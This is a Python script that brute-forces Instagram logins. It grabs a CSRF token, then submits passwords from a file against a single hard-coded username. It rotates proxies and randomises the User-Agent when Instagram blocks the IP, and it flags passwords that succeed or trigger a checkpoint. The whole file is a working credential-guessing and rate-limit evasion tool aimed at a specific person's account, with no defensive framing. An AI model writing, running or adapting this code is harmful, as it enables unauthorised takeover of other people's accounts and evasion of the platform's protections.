# coding=utf-8
from __future__ import print_function
import argparse
import logging
import random
import socket
import sys
import threading
import json
import requests
from random import randint
try:
    import urllib.request as rq
    from urllib.error import HTTPError
    import urllib.parse as http_parser
except ImportError:
    import urllib2 as rq
    from urllib2 import HTTPError
    import urllib as http_parser

try:
    import Queue
except ImportError:
    import queue as Queue
num = 1;
proxies = {}
def changeglobal():
    global num;
    num = num+1




class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



def changeproxy():
    global proxies;
    ase = num
    khas = 1;
    url = "http://192.168.1.101:3000/proxy%d"%(khas)
    #url = "http://pubproxy.com/api/proxy?type=http&format=txt"
    r = requests.get(url)
    data = r.content;
    print(data)
    ehsi = "https://%s"%(data)
    proxies = {
        'https': 'https://' + data
    }
    sqqw = requests.get("https://api.ipify.org",proxies=proxies)
    sasa = data;
    sasas = sqqw.content;
    if sasa in sasas:
        print('ip changed')
    else:
        print('proxy not change tryagain')
        khas =+ 1
        changeproxy()

def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print(bcolors.WARNING + "[+] Getting CSRF Token: " + bcolors.ENDC)

    try:
        opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)

        request = rq.Request('https://www.instagram.com/')
        try:
            # python 2
            headers = rq.urlopen(request).info().headers
        except Exception:
            # python 3
            headers = rq.urlopen(request).info().get_all('Set-Cookie')

        for header in headers:
            if header.find('csrftoken') != -1:
                csrf_token = header.partition(';')[0].partition('=')[2]
                print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
    except Exception as err:
        print(bcolors.FAIL + "[!] Can't get CSRF token , please use -d for debug" + bcolors.ENDC)

        if _debug:
            logger.error(err)

        print(bcolors.FAIL + "[!] Exiting..." + bcolors.ENDC)
        exit(3)

def start_brute():
    globalscop = randint(11111111,99999999)
    sakam = "Mozilla/5.0(X11; Ubuntu; Linu…)Gecko/%d Firefox/64.0"%(globalscop);
    pro = open("proxy.txt","r").readlines()
    header = {
        "User-Agent": sakam,
        'X-Instagram-AJAX': '1',
        "X-CSRFToken": csrf_token,
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Cookie': 'csrftoken=' + csrf_token
    }
    f = open("password.txt","r").readlines()
    s = open("user.txt","r").readlines()
    asz = open("paired.txt","w+")
    for line in s:
        password = line.strip()
        r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"hosnaa.83","password":password},headers=header,proxies=proxies)
        content = r.content;
        if "checkpoint_required" in content:
            print(bcolors.OKGREEN+'password found but need checkpoint | '+password)
            break;
        if ("Please wait a few minutes before you try again" in content):
            print(bcolors.FAIL + 'IP Blocked')
            changeglobal()
            changeproxy()
            pass;
        if "authenticated: true" not in content:
            print(bcolors.FAIL + "Incorrect |-| "+password)
            print(content)
        if "userId" in content:
            print(bcolors.OKGREEN + 'Paired Found |+| '+ password)
            break;





get_csrf()
start_brute()
